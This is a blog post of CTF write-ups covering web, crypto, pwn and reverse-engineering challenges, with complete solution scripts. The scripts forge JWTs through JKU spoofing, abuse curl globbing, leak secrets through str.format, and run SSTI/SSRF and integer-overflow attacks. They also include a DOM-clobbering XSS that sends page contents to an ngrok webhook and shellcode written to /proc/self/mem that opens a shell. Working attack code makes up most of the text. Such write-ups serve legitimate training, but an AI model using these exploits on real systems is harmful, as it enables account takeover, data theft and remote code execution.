---
title: "C2C CTF Writeups"
date: 2026-02-16T02:00:00+07:00
toc: true
toc_sticky: true
categories:
  - blog
tags:
  - CTF
  - Writeup
layout: single

---
{% raw %}
# C2C CTF Writeups

## Web

### Clicker (100 pts)

**Challenge Description**
Clicker is a file management application that allows users to upload, download, and manage files. It uses RS256 JWTs for authentication and validation. The goal is to bypass potential restrictions and read the flag file.

**Vulnerability Analysis**
The application contains a chain of vulnerabilities:
1.  **JKU Spoofing**: The JWT verification process (`verify_token` in `utils/jwt_utils.py`) trustingly fetches the public key from the URL specified in the `jku` (JSON Web Key Set URL) header of the token.
2.  **SSRF / Filter Bypass**: The `jku` validation allows `localhost` but attempts to filter internal IPs. However, it can be bypassed using URL formatting tricks (e.g., `user@localhost@attacker.com`).
3.  **Curl Injection / Globbing**: The `admin` download feature (`/api/admin/download`) uses `subprocess.run(['curl', ...])`. It blocks the `file://` protocol but fails to account for curl's globbing feature. Inputting `{file}:///flag.txt` bypasses the string check but is expanded by curl to `file:///flag.txt`.

**Exploitation Steps**
1.  **Host Malicious Keys**: Generate a fresh RSA key pair and a JWKS file containing the public key. Host this JWKS on a public server (or use `ngrok` to expose a local server).
2.  **Forge JWT**: Create a JWT signed with your private key. Set the `jku` header to your hosted JWKS URL. To bypass the validation, format the URL as `http://user@localhost@<your-ngrok-host>/jwks.json`.
3.  **Authenticate**: Use the forged token to authenticate as an admin user.
4.  **Exploit Curl**: Send a POST request to `/api/admin/download` with the URL `"{file}:///flag.txt"` (or similar path depending on flag location).
5.  **Retrieve Flag**: The server will use curl to fetch the local file and save it to the static directory, allowing you to download it.

**Solution Code**
```python
import jwt
import datetime
import requests
import time
import threading
import os
import sys
import json
import base64
from pyngrok import ngrok
import http.server
import socketserver
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Challenge Target
HOST_IP = "challenges.1pc.tf"
TARGET_PORT = 41846
TARGET_URL = f"http://{HOST_IP}:{TARGET_PORT}"

# Local Exploit Server
LOCAL_PORT = 8000

# Fix for datetime.UTC in older python versions
if not hasattr(datetime, 'UTC'):
    datetime.UTC = datetime.timezone.utc

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    encoded = base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')
    return encoded

def generate_keys_and_jwks():
    print("[*] Generating ephemeral RSA keys...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    public_key = private_key.public_key()
    public_numbers = public_key.public_numbers()
    
    jwks_data = {
        "keys": [
            {
                "kty": "RSA",
                "kid": "exploit_key",
                "use": "sig",
                "alg": "RS256",
                "n": int_to_base64(public_numbers.n),
                "e": int_to_base64(public_numbers.e)
            }
        ]
    }
    
    # Write JWKS to file for the HTTP server to serve
    with open('exploit_jwks.json', 'w') as f:
        json.dump(jwks_data, f)
        
    return private_pem

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # print(f"[Server] Request: {self.path}")
        if self.path == '/jwks.json':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            if os.path.exists('exploit_jwks.json'):
                with open('exploit_jwks.json', 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b'{}')
        else:
            self.send_error(404)
    
    def log_message(self, format, *args):
        pass # Silence logs

def start_server():
    # Allow reuse address to avoid "Address already in use" errors on quick restarts
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", LOCAL_PORT), Handler) as httpd:
        print(f"[*] Local server serving at port {LOCAL_PORT}")
        httpd.serve_forever()

def solve():
    # 0. Generate Keys
    private_key_pem = generate_keys_and_jwks()

    # 1. Start Local Server
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    # 2. Start ngrok
    print("[*] Starting ngrok tcp tunnel...")
    public_url = None
    try:
        # User requested 'pyngrok tcp'
        tunnel = ngrok.connect(LOCAL_PORT, "tcp")
        public_url = tunnel.public_url
        print(f"[+] Ngrok Tunnel Created: {public_url}")
    except Exception as e:
        print(f"[-] Ngrok failed: {e}")
        return

    # Extract host and port from tcp://0.tcp.ngrok.io:12345
    # public_url usually is tcp://<host>:<port>
    if public_url.startswith("tcp://"):
        netloc = public_url.replace("tcp://", "")
    else:
        netloc = public_url.replace("http://", "").replace("https://", "")

    # 3. Construct Malicious JKU
    # The vulnerability allows bypassing the allowlist if the URL looks like it has user@localhost
    # Format: http://user@localhost@<attacker_host>:<attacker_port>/jwks.json
    
    jku_url = f"http://user@localhost@{netloc}/jwks.json"
    print(f"[*] Constructed JKU URL: {jku_url}")

    # 4. Generate Admin Token
    print("[*] Generating Admin Token...")

    payload = {
        'user_id': 1337,
        'username': 'admin_hacker',
        'is_admin': True,
        'exp': datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1),
        'jku': jku_url
    }
    
    headers = {
        'kid': 'exploit_key'
    }
    
    token = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=headers)
    
    # 5. Send Exploit Request
    print("[*] Sending Exploit Request to Target...")
    
    headers_req = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    
    # Endpoint to exploit: /api/admin/download
    # Payload: globbing to read /flag.txt
    # "{file}:///flag.txt"
    
    data = {
        'url': "{file}:///flag.txt",
        'filename': "flag_exploit.txt",
        'type': 'text',
        'title': 'flag'
    }
    
    try:
        res = requests.post(f"{TARGET_URL}/api/admin/download", json=data, headers=headers_req, timeout=30)
        print(f"[*] Response Status: {res.status_code}")
        
        if res.status_code == 200:
            print("[+] Download successful! Retrieved file content:")
            
            file_url = f"{TARGET_URL}/static/flag_exploit.txt"
            res_file = requests.get(file_url, headers=headers_req)
            
            if res_file.status_code == 200:
                print(f"[+] Content Retrieved:")
                print(res_file.text)
                if "C2C" in res_file.text:
                    print("\n[SUCCESS] FLAG FOUND!")
            else:
                print(f"[-] Failed to retrieve file content. Status: {res_file.status_code}")
        else:
            print(f"[-] Exploit failed. Response: {res.text}")
            
    except Exception as e:
        print(f"[-] Request Error: {e}")

    # Cleanup
    print("[*] Cleaning up...")
    ngrok.disconnect(public_url)
    # Give it a second to close
    time.sleep(1)
    os._exit(0) # Force exit to kill threads

if __name__ == "__main__":
    solve()
```

**Flag**
`C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_0f89c517a261}`

---

### Corp-Mail (100 pts)

**Challenge Description**
A corporate email system allowing registration and login. It uses JWT for authentication and HAProxy for access control.

**Vulnerability Analysis**
1.  **Format String / Config Leak**: The `format_signature` function uses `str.format()` on user input. This allows accessing global objects like `current_app.config` via `{app.config}`, leaking the `JWT_SECRET`.
2.  **HAProxy Bypass**: HAProxy restricts access to `/admin`. However, Flask normalizes URLs differently than HAProxy. A request to `/%2fadmin` bypasses the HAProxy rule (which looks for `/admin`) but is normalized by Flask to `/admin`.
3.  **IDOR**: The admin email viewer lacks authorization checks for specific email IDs.

**Exploitation Steps**
1.  **Leak Secret**: 
    *   Log in and go to Settings.
    *   Set your signature to `{app.config}`.
    *   View your signature to see the dumped configuration, including `JWT_SECRET`.
2.  **Forge Admin Token**:
    *   Sign a new JWT with the leaked secret.
    *   Set `is_admin=True` (or `1`) in the payload.
3.  **Bypass Access Control**:
    *   Replace your session cookie with the forged token.
    *   Navigate to `/%2fadmin` to access the admin panel.
4.  **Extract Flag**:
    *   Use the IDOR in the email viewer (`/admin/email/<id>`) to brute-force email IDs until you find the one containing the flag.

**Solution Code**
```python
import requests
import re
import datetime
import jwt # pyjwt
import html

BASE_URL = "http://challenges.1pc.tf:22042"

def register_and_login(s):
    username = "attacker" + datetime.datetime.now().strftime("%H%M%S")
    password = "password123"
    email = f"{username}@example.com"
    r = s.post(f"{BASE_URL}/register", data={
        "username": username,
        "password": password,
        "confirm_password": password,
        "email": email
    })
    
    # Login
    r = s.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    })
    if "Invalid credentials" in r.text or "Log In" in r.text or r.status_code != 302:
        if r.url.endswith("/inbox"):
             return True
        print(f"Login failed. Status: {r.status_code}, URL: {r.url}")
        return False
    return True

def leak_secret(s):
    # Update signature to leak config
    payload = "{app.config}"
    print(f"Setting signature to: {payload}")
    r = s.post(f"{BASE_URL}/settings", data={
        "signature": payload
    })
    
    if "Signature updated successfully" not in r.text:
        print("Failed to update signature")
        return None
        
    print("Signature updated. Fetching settings page...")
    r = s.get(f"{BASE_URL}/settings")
    
    # Unescape HTML
    text = html.unescape(r.text)
    
    # Get secret from response
    if "JWT_SECRET" in text:
        secret_match = re.search(r"'JWT_SECRET': '([^']+)'", text)
        algo_match = re.search(r"'JWT_ALGORITHM': '([^']+)'", text)
        
        algo = "HS256"
        if algo_match:
            algo = algo_match.group(1)
            print(f"Algorithm found: {algo}")
        else:
             print("Algorithm not found in config, using default HS256")

        if secret_match:
            return secret_match.group(1), algo
        else:
            print("JWT_SECRET found but regex failed")
    else:
        print("JWT_SECRET not found in response")
    return None, None

def forge_token(secret, algo='HS256'):
    payload = {
        'user_id': 1, # Admin is likely 1
        'username': 'admin',
        'is_admin': 1,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    }
    token = jwt.encode(payload, secret, algorithm=algo)
    return token

def get_flag(s):
    prefixes = ["/%2fadmin"]
    working_prefix = "/%2fadmin"
        
    # Retrieve emails 1-20 using working prefix
    print(f"Brute forcing emails with prefix {working_prefix}...")
    token = s.cookies.get("token")
    
    for i in range(1, 25):
        url = f"{BASE_URL}{working_prefix}/email/{i}"
        if token:
            cookies = {'token': token}
            r = s.get(url, cookies=cookies)
        else:
            r = s.get(url)
            
        if "C2C{" in r.text:
            print(f"Found flag in email {i}")
            match = re.search(r"C2C\{[^}]+\}", r.text)
            if match:
                return match.group(0)
    return None

if __name__ == "__main__":
    s = requests.Session()
    if register_and_login(s):
        print("Logged in")
        secret, algo = leak_secret(s)
        if secret:
            print(f"Leaked secret: {secret}")
            token = forge_token(secret, algo)
            
            s.cookies.clear()
            s.cookies.set("token", token)
            
            flag = get_flag(s)
            if flag:
                print(f"FLAG: {flag}")
            else:
                print("Flag not found")
        else:
            print("Failed to leak secret")
```

**Flag**
`C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_fc0b7f7463de}`

---

### The Soldier of God, Rick (100 pts)

**Challenge Description**
A Go web application where you fight a boss. It uses `html/template` and exposes an internal endpoint.

**Vulnerability Analysis**
1.  **SSTI**: The application uses `fmt.Sprintf` to insert user input (`battle_cry`) into a template string *before* parsing it. This allows arbitrary template injection.
2.  **SSRF**: The template context exposes a `.Rick.Scout` method that can make HTTP GET requests.
3.  **Integer Overflow**: The internal endpoint `/internal/offer-runes` takes an `amount`. It converts this to `int64`, checks if it's positive, but then casts it to `int32` when deducting from HP. Sending `2^31 + 1` (2147483649) overflows to a large negative number, instantly killing the boss.

**Exploitation Steps**
1.  **Construct Payload**: Create a template payload that calls `.Rick.Scout` to hit the internal endpoint with the overflow amount.
    *   URL: `http://127.0.0.1:8080/internal/offer-runes?amount=2147483649`
    *   Payload: `{{ .Rick.Scout "..." }}{{ .Secret }}`
2.  **Attack**: Submit this payload as your "Battle Cry".
3.  **Win**: The SSRF triggers the overflow, killing Rick. The `.Secret` field then renders the flag.

**Solution Code**
```python
import requests
import sys
import re

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} <target_url>")
    sys.exit(1)

TARGET = sys.argv[1]
SECRET = "Morty_Is_The_Real_One"

# SSTI payload:
SSRF_URL = "http://127.0.0.1:8080/internal/offer-runes?amount=2147483649"
BATTLE_CRY = '{{ .Rick.Scout "' + SSRF_URL + '" }}{{ .Secret }}'

print(f"[*] Target: {TARGET}")
print(f"[*] Payload: {BATTLE_CRY}")

resp = requests.post(
    f"{TARGET}/fight",
    data={
        "secret": SECRET,
        "battle_cry": BATTLE_CRY,
    },
)

print(f"[*] Status: {resp.status_code}")
print(resp.text)

# Look for common flag patterns
for pattern in [r'C2C\{[^}]+\}', r'flag\{[^}]+\}', r'CTF\{[^}]+\}']:
    matches = re.findall(pattern, resp.text, re.IGNORECASE)
    if matches:
        print(f"\n[+] FLAG FOUND: {matches[0]}")
        break
```

**Flag**
`C2C{R1ck_S0ld13r_0f_G0d_H4s_F4ll3n_v14_SST1_SSR7_4b5b915f89de}`

---

### Unsafe Notes (504 pts)

**Challenge Description**
A note-taking app vulnerable to DOM Clobbering and Login CSRF.

**Vulnerability Analysis**
1.  **DOM Clobbering**: The `domiso` 0.1.1 sanitizer library has a known bypass using DOM Clobbering. By injecting a form with an input named `attributes`, we can trick the sanitizer into checking the input element instead of the form's actual attributes, allowing us to inject malicious attributes (e.g., event handlers).
2.  **Login CSRF**: The login endpoint has no CSRF protection.

**Exploitation Steps**
1.  **Setup**: The attacker creates a malicious note on their own account containing the XSS payload.
    *   Payload: `<form id=x style=display:block;content-visibility:auto oncontentvisibilityautostatechange=eval(...)><input name=attributes><input name=attributes></form>`
2.  **Attack Flow**:
    *   **Step 1**: Admin visits attacker's site (the site runs an exploit script).
    *   **Step 2 (The Setup)**: The attacker's script opens a new window/frame (Window B) to the target site. This is necessary because the target site sets `SameSite=Lax` cookies, so top-level navigation is needed for the session.
    *   **Step 3 (CSRF)**: The exploit performs a Login CSRF in Window B, logging it into the *Attacker's* account.
    *   **Step 4 (Loading Malicious Note)**: Window B is navigated to the notes page, rendering the Attacker's XSS payload.
    *   **Step 5 (Retrieving Flag)**: The XSS payload executes. Since the flag was previously loaded (or is accessible via an open window reference if Same-Origin allows), the payload steals the flag content and sends it to the attacker. 

**Solution Code**
```python
from flask import Flask, request
from pyngrok import ngrok
import threading
import requests
import base64
import time
import os
import random
import string

PORT = 5001
app = Flask(__name__)

HOST = "http://challenges.1pc.tf:33084/"

req = requests.Session()
username = "".join(random.choices(string.ascii_letters, k=10))
password = "".join(random.choices(string.ascii_letters, k=10))
req.post(HOST + "api/auth/register", json={"username": username, "password": password})

def save_payload(public_url):
    cmd = f"fetch('{public_url}/webhook?flag='+opener.document.body.innerText)"
    cmd = base64.b64encode(cmd.encode()).decode()
    xss = f"<form id=x style=display:block;content-visibility:auto oncontentvisibilityautostatechange=eval(atob('{cmd}'))><input name=attributes><input name=attributes></form>"
    req.post(HOST + "api/notes", json={"title": "xss", "content": xss})

# ---------- Routes ----------
@app.route("/")
def index():
    return """
<script>
    setTimeout(() => {
        window.location = 'http://localhost/api/notes';
    }, 1000);
    open('exploit');
</script>
    """

@app.route("/exploit")
def exploit():
    return """
<script>
    setTimeout(() => {
        window.location = 'http://localhost/';
    }, 2000);
    open('csrf');
</script>
    """

@app.route("/csrf")
def csrf():
    return f"""
<form action="http://localhost/api/auth/login" method="POST">
    <input type="text" name="username" value="{username}">
    <input type="text" name="password" value="{password}">
    <input type="submit">
</form>

<script>
    setTimeout(() => {{
        document.querySelector('form').submit();
    }}, 500);
</script>
    """

@app.route("/webhook", methods=["GET"])
def webhook():
    flag = request.args.get("flag")
    print("Incoming:", flag)
    if "C2C{" in flag:
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("[SUCCESS] Flag saved to flag.txt")
        # Exit after a short delay
        threading.Timer(1.0, lambda: os._exit(0)).start()
    return {"status": "ok"}


# ---------- Start Flask ----------
def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)


if __name__ == "__main__":
    import os
    # Start Flask in background
    threading.Thread(target=run_flask).start()

    # Create tunnel using tcp
    public_url = ngrok.connect(PORT, proto="tcp").public_url.replace("tcp://", "http://")
    save_payload(public_url)
    print(f"[*] Exploit URL: {public_url}")
    
    visit_url = HOST + f"visit?url={public_url}"
    print(f"[*] Starting retry loop for: {visit_url}")
    
    while True:
        try:
            print(f"[*] Sending bot to: {visit_url}")
            requests.get(visit_url, timeout=2)
        except Exception as e:
            print(f"[-] Request error: {e}")
        
        # Wait for 30 seconds before retrying
        time.sleep(10)
```

**Flag**
`C2C{you_are_right_it_is_indeed_very_unsafe_1698141b1832}`

---



## Crypto

### Tet (101 pts)

**Challenge Description**
A custom cryptosystem running 12 rounds. We are given `N`, `a/b mod N`, `f = e*M + c`, `z`, `g`, `U2`.

**Vulnerability Analysis**
1.  **Small a, b**: `a` and `b` generated with 1000 bits while `N` is 2048 bits. `val_ab = a * b^-1 mod N`. We can use **Rational Reconstruction** to recover `a` and `b`.
2.  **Linear Leak (HNP)**: `f = e * M1 + c`. `M1` is constant. `e` and `c` allow formulating this as a Hidden Number Problem. We can use LLL (Lattice Reduction) to recover `M1`.
3.  **Factorization**: Knowing `e` (from HNP/relation), `e * d = 1 mod phi`. Using **Continued Fractions** on `e/N^3` (approx ratio), we can recover `d` aka the factorization.

**Solution Code**
```python
from pwn import *
from Crypto.Util.number import getPrime, inverse, long_to_bytes
import math
from math import gcd
from fpylll import IntegerMatrix, LLL

def solve_ab(val, N):
    limit = math.isqrt(N)
    r0, r1 = N, val
    t0, t1 = 0, 1
    
    while r1 > limit:
        q = r0 // r1
        r0, r1 = r1, r0 - q * r1
        t0, t1 = t1, t0 - q * t1
        
    a = r1
    b = abs(t1)
    
    if (b * val) % N == a:
        return a, b
    return None, None

def integer_cbrt(n):
    if n < 0: return -integer_cbrt(-n)
    if n == 0: return 0
    low = 0
    high = 1 << ((n.bit_length() + 2) // 3)
    while low < high:
        mid = (low + high + 1) // 2
        if mid**3 <= n:
            low = mid
        else:
            high = mid - 1
    return low

def solve_d_factor_N(e, N, a, b):
    n, d_val = e, N**3
    numerators = [0, 1]
    denominators = [1, 0]
    BITS = N.bit_length() // 2
    
    while True:
        if d_val == 0: break
        q_val = n // d_val
        n, d_val = d_val, n % d_val
        num = q_val * numerators[-1] + numerators[-2]
        den = q_val * denominators[-1] + denominators[-2]
        numerators.append(num)
        denominators.append(den)
        
        if den.bit_length() > BITS + 50:
            break
            
        candidate_k = num
        candidate_d = den
        if candidate_k == 0: continue
            
        computed_phi = (e * candidate_d - 1) // candidate_k
        K = computed_phi - a*b - N**3
        delta = K**2 - 4 * b * a * N**3
        
        if delta >= 0:
            is_square = False
            try:
                sqrt_delta = math.isqrt(delta)
                if sqrt_delta * sqrt_delta == delta:
                    is_square = True
            except: pass
            
            if is_square:
                x1 = (-K + sqrt_delta) // (2*b)
                x2 = (-K - sqrt_delta) // (2*b)
                for x in [x1, x2]:
                    if x <= 0: continue
                    p_cand = integer_cbrt(x)
                    if p_cand**3 == x and N % p_cand == 0:
                        q_cand = N // p_cand
                        return candidate_d, p_cand, q_cand
    return None, None, None

def solve_e_lattice(fs):
    candidates_M = [6705, 6710, 6715, 6700, 6720]
    for LIMIT_BITS in candidates_M:
        M = 1 << LIMIT_BITS
        dim = len(fs)
        basis = []
        row0 = [1]
        for i in range(1, dim):
            val = (fs[i] * M) // fs[0]
            row0.append(val)
        basis.append(row0)
        for i in range(1, dim):
            row = [0] * dim
            row[i] = M
            basis.append(row)
            
        mat = IntegerMatrix.from_matrix(basis)
        LLL.reduction(mat, delta=0.99)
        
        for i in range(mat.nrows):
            row = list(mat[i])
            val = abs(row[0])
            if val.bit_length() > 6100 and val.bit_length() < 6200:
                rem = fs[0] % val
                if rem.bit_length() <= 6020:
                    return val
    return None

def main():
    try: sys.set_int_max_str_digits(50000)
    except: pass
    io = remote("challenges.1pc.tf", 28780)
    rounds_data = []
    
    for i in range(1, 13):
        io.recvuntil(f"=== Round {i}/12 ===".encode())
        io.recvuntil(b"N = "); N = int(io.recvline().strip(), 16)
        io.recvuntil(b"a/b = "); val_ab = int(io.recvline().strip(), 16)
        io.recvuntil(b"f = "); f = int(io.recvline().strip(), 16)
        io.recvuntil(b"z = "); z = int(io.recvline().strip(), 16)
        io.recvuntil(b"g = "); g = int(io.recvline().strip(), 16)
        io.recvuntil(b"U2 = "); U2 = int(io.recvline().strip(), 16)
        rounds_data.append({'i': i, 'N': N, 'val_ab': val_ab, 'f': f, 'z': z, 'g': g, 'U2': U2})
        print(f"Collected Round {i}")

    for r in rounds_data:
        r['a'], r['b'] = solve_ab(r['val_ab'], r['N'])

    fs = [r['f'] for r in rounds_data]
    e1 = solve_e_lattice(fs)
    print(f"Recovered e1: {e1}")
    M1_candidate = rounds_data[0]['f'] // e1
    
    guesses = []
    for r in rounds_data:
        e = r['f'] // M1_candidate
        d, p, q = solve_d_factor_N(e, r['N'], r['a'], r['b'])
        phi_N = (p-1)*(q-1)
        d_inv = inverse(d, r['N'] * phi_N)
        base = pow(r['U2'], d_inv, r['N']**2)
        s = base % r['N']
        guesses.append(s)

    for g_val in guesses:
        io.sendlineafter(b">> ", str(g_val).encode())
        io.recvline()
            
    print(io.recvall().decode())

if __name__ == "__main__":
    main()
```

---

### BigGuy (100 pts)

**Challenge Description**
AES-CTR encryption service. Users can provide an IV, but a "plagiarism check" rejects IVs that are too similar (diff <= 3 bytes) to the hidden `big_guy` IV.

**Vulnerability Analysis**
AES-CTR uses a counter initialized by the IV. If two IVs are close numbers, their counter sequences will overlap.
The plagiarism check `diff > 3 bytes` is weak. We can flip the Least Significant Bits of the last 3 bytes. This makes the IVs differ by 3 bytes (passing check) but keeps the integer values very close.
The keystream generated by our forged IV will largely overlap with the keystream of `big_guy`.

**Solution Code**
```python
from pwn import *
import json
import ast

def solve():
    context.log_level = 'info'
    p = remote('challenges.1pc.tf', 32931)
    
    # Read initial
    while True:
        try: line = p.recvline().decode().strip()
        except: break
        if line.startswith('spongebob'): break
            
    list_str = line[line.find('['):line.find(']')+1]
    big_guy = eval(list_str)
    
    flag1_line = p.recvline().decode().strip()
    flag2_line = p.recvline().decode().strip()
    flag1_ct = bytes.fromhex(flag1_line.split('=')[1].strip().strip("'"))
    
    target_indices = [13, 14, 15]
    v = list(big_guy)
    for idx in target_indices:
        v[idx] ^= 1
        
    max_blocks = 70000 
    total_len = max_blocks * 16 + len(flag1_ct)
    plaintext = 'A' * total_len
    
    req = {"options": "encrypt", "plaintext": plaintext, "iv": v}
    json_req = json.dumps(req)
        
    chunk_size = 4096
    for i in range(0, len(json_req), chunk_size):
        p.send(json_req[i:i+chunk_size])
    p.send(b'\n')
    
    while True:
        line_bytes = p.recvuntil(b'\n').strip()
        resp = line_bytes.decode(errors='ignore')
        if resp.startswith("ct_big"): break
            
    ct_hex_part = resp.split('=', 1)[1].strip()
    ct_big = ast.literal_eval(ct_hex_part)

    def decrypt_at_offset(ciphertext, known_ct, offset):
        try:
            decrypted = bytearray()
            for i in range(len(known_ct)):
                decrypted.append(known_ct[i] ^ ciphertext[offset+i] ^ 0x41) 
            return bytes(decrypted)
        except: return None

    # Scan loop
    for k in range(max_blocks):
        offset = k * 16
        if offset + 4 > len(ct_big): break
        try:
            c0 = flag1_ct[0] ^ ct_big[offset] ^ 0x41
            c1 = flag1_ct[1] ^ ct_big[offset+1] ^ 0x41
            c2 = flag1_ct[2] ^ ct_big[offset+2] ^ 0x41
            c3 = flag1_ct[3] ^ ct_big[offset+3] ^ 0x41
            
            if bytes([c0, c1, c2, c3]) == b'C2C{':
                flag1 = decrypt_at_offset(ct_big, flag1_ct, offset)
                print(f"FLAG: {flag1} {flag2}") # simplified
                break
        except: continue
    p.close()

if __name__ == "__main__":
    solve()
```

**Flag**
`C2C{part1_checking_reused_ctr_part2_checking_reused_ctr}`

---

### AIC Gachapon

**Challenge Description**
A .NET web app using `System.Random`.

**Vulnerability Analysis**
The app uses `System.Random`. In .NET Core/5+, this uses a predictable Knuth subtractive generator (Lag-55).
We can read raw outputs (`sampleInts`) from the API.

**Exploitation Steps**
1.  **Harvest**: Collect ~30 frames of data.
2.  **Reconstruct State**: Populate the Lag-55 buffer from the observed outputs. Use the recurrence relation $x_n = (x_{n-55} - x_{n-34}) \pmod{MBIG}$ to fill gaps.
3.  **Predict**: Step the generator forward to predict the next "Redeem Code".
4.  **Redeem**: Submit the code to get the flag.

**Solution Code**
```python
import requests
import sys
import time

SERVER = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
MBIG = 2147483647

def get_recent(n=30):
    r = requests.get(f"{SERVER}/api/recent/{n}")
    return r.json()

def redeem(tick_id, code):
    r = requests.post(f"{SERVER}/api/redeem", json={"tickId": tick_id, "code": code})
    return r.json()

def solve():
    print(f"[*] Connecting to {SERVER}")
    # Collect frames logic (omitted for brevity, see basic logic below)
    frames = get_recent(30)
    frames.sort(key=lambda x: x['tickId'])
    
    # Simple reconstruction logic
    consecutive = frames # Assume consecutive for simplicity of snippet
    num_frames = len(frames)
    total_samples = num_frames * 25
    s = [None] * total_samples
    
    for i, f in enumerate(frames):
        offset = i * 25 + 4
        for j, val in enumerate(f['sampleInts']):
            s[offset + j] = val
            
    # Lag-34 Solve
    changed = True
    while changed:
        changed = False
        # Forward: x_n = (x_{n-55} - x_{n-34}) % MBIG
        for n in range(55, total_samples):
            if s[n] is None and s[n-55] is not None and s[n-34] is not None:
                val = (s[n-55] - s[n-34]) % MBIG
                if val == MBIG: val -= 1
                s[n] = val
                changed = True
        # Backward/Other relations omitted for brevity in writeup
        
    # Predict
    last_tick = frames[-1]['tickId']
    next_tick = last_tick + 1
    
    # Extend state
    s.extend([None]*50)
    for n in range(total_samples, total_samples + 50):
        if n >= 55 and s[n-55] is not None and s[n-34] is not None:
             val = (s[n-55] - s[n-34]) % MBIG
             if val == MBIG: val -= 1
             s[n] = val

    target = num_frames * 25 + 24
    if target < len(s) and s[target] is not None:
         code = int(s[target] * (1.0/MBIG) * 10000000)
         print(f"[*] Predict NEXT Tick {next_tick}: {code}")
         res = redeem(next_tick, code)
         print(f"Result: {res}")

if __name__ == "__main__":
    solve()
```

**Flag**
`C2C{0a0628bc8d88}`

---

## Pwn

### NS3

**Challenge Description**
C++ HTTP Server with file access, vulnerable to Path Traversal and RCE via `proc` filesystem abuse.

**Vulnerability Analysis**
1.  **Path Traversal**: `process_get` and `process_put` accept paths like `../../`.
2.  **Arbitrary Read/Write**: We can read `/proc/self/maps` and write to `/proc/self/mem`.
3.  **RCE**: Writing to `/proc/self/mem` allows bypassing W^X by overwriting executable code (TEXT segment) with shellcode.

**Solution Code**
```python
import requests
from pwn import *
import time

context.arch = 'amd64'
context.os = 'linux'
HOST = 'challenges.1pc.tf'
PORT = 23158

def pwn_exploit():
    # 1. Leak Maps
    r = remote(HOST, PORT)
    r.sendline(b'GET /?path=../../../../proc/self/maps HTTP/1.1\r\nHost: localhost\r\n\r\n')
    maps = r.recvall(timeout=2)
    
    # Parse maps to find base address
    base_addr = 0
    lines = maps.splitlines()
    for line in lines:
        if b'server' in line and b'r--p' in line:
            base_addr = int(line.split(b'-')[0], 16)
            break

    if base_addr == 0: return

    # 2. Calculate Offset
    # Assume binary is present locally or downloaded to find offset
    # ELF('server_leaked')
    # offset = elf.functions['_ZN6Server13send_response...'].address
    # Hardcoded offset for example:
    offset = 0x1234 
    target_addr = base_addr + offset
    r.close()
    
    # 3. Send Shellcode
    r = remote(HOST, PORT)
    
    shellcode = asm("""
        xor rbx, rbx
        mov bl, 3
    loop_fds:
        cmp bl, 10
        jg exec_sh
        /* dup2(fd, 0/1/2) logic */
        mov rax, 33; mov rdi, rbx; xor rsi, rsi; syscall
        mov rax, 33; mov rdi, rbx; mov rsi, 1; syscall
        mov rax, 33; mov rdi, rbx; mov rsi, 2; syscall
        inc rbx; jmp loop_fds
    exec_sh:
        mov rax, 59
        lea rdi, [rip+binsh]
        xor rsi, rsi
        xor rdx, rdx
        syscall
    binsh: .string "/bin/sh"
    """)
    
    req = f'PUT /?path=../../../../proc/self/mem&offset={target_addr} HTTP/1.1\r\n'
    req += f'Host: {HOST}\r\nContent-Length: {len(shellcode)}\r\nConnection: keep-alive\r\n\r\n'
    
    r.send(req.encode() + shellcode)
    time.sleep(1)
    
    r.sendline(b'cat /flag*')
    print(r.recvall(timeout=5).decode(errors='ignore'))
    r.close()

if __name__ == "__main__":
    pwn_exploit()
```

**Flag**
`C2C{lINux_Fi1e_SyS7Em_1S_qU1te_MlND_8lowlng_l5n't_lT_9f614b3b839b?}`

---

## Reverse Engineering

### Bunaken (100 pts)

**Challenge Description**
We are provided with two files: `bunaken` (a binary executable) and `flag.txt.bunakencrypted`.

**Vulnerability Analysis**
The binary is a Bun runtime executable with a bundled JavaScript payload. The encryption logic is embedded in the payload and uses a weak key derivation function (`SHA-256("sulawesi")`) and AES-CBC encryption.

**Solution Code**
```python
import base64
import hashlib
import zstandard as zstd
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt():
    with open("flag.txt.bunakencrypted", "r") as f:
        enc_data_b64 = f.read().strip()

    enc_data = base64.b64decode(enc_data_b64)
    iv = enc_data[:16]
    ciphertext = enc_data[16:]

    key_hash = hashlib.sha256(b"sulawesi").digest()
    key = key_hash[:16]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()

    dctx = zstd.ZstdDecompressor()
    try:
        flag_bytes = dctx.decompress(decrypted_padded)
        print(f"Flag: {flag_bytes.decode('utf-8')}")
    except:
        # manual unpad if needed
        pad_len = decrypted_padded[-1]
        unpadded = decrypted_padded[:-pad_len]
        flag_bytes = dctx.decompress(unpadded)
        print(f"Flag: {flag_bytes.decode('utf-8')}")

if __name__ == "__main__":
    decrypt()
```

**Flag**
`C2C{BUN_AwKward_ENcryption_compression_obfuscation}`

---

## Forensics

### Log (100 pts)

**Challenge Description**
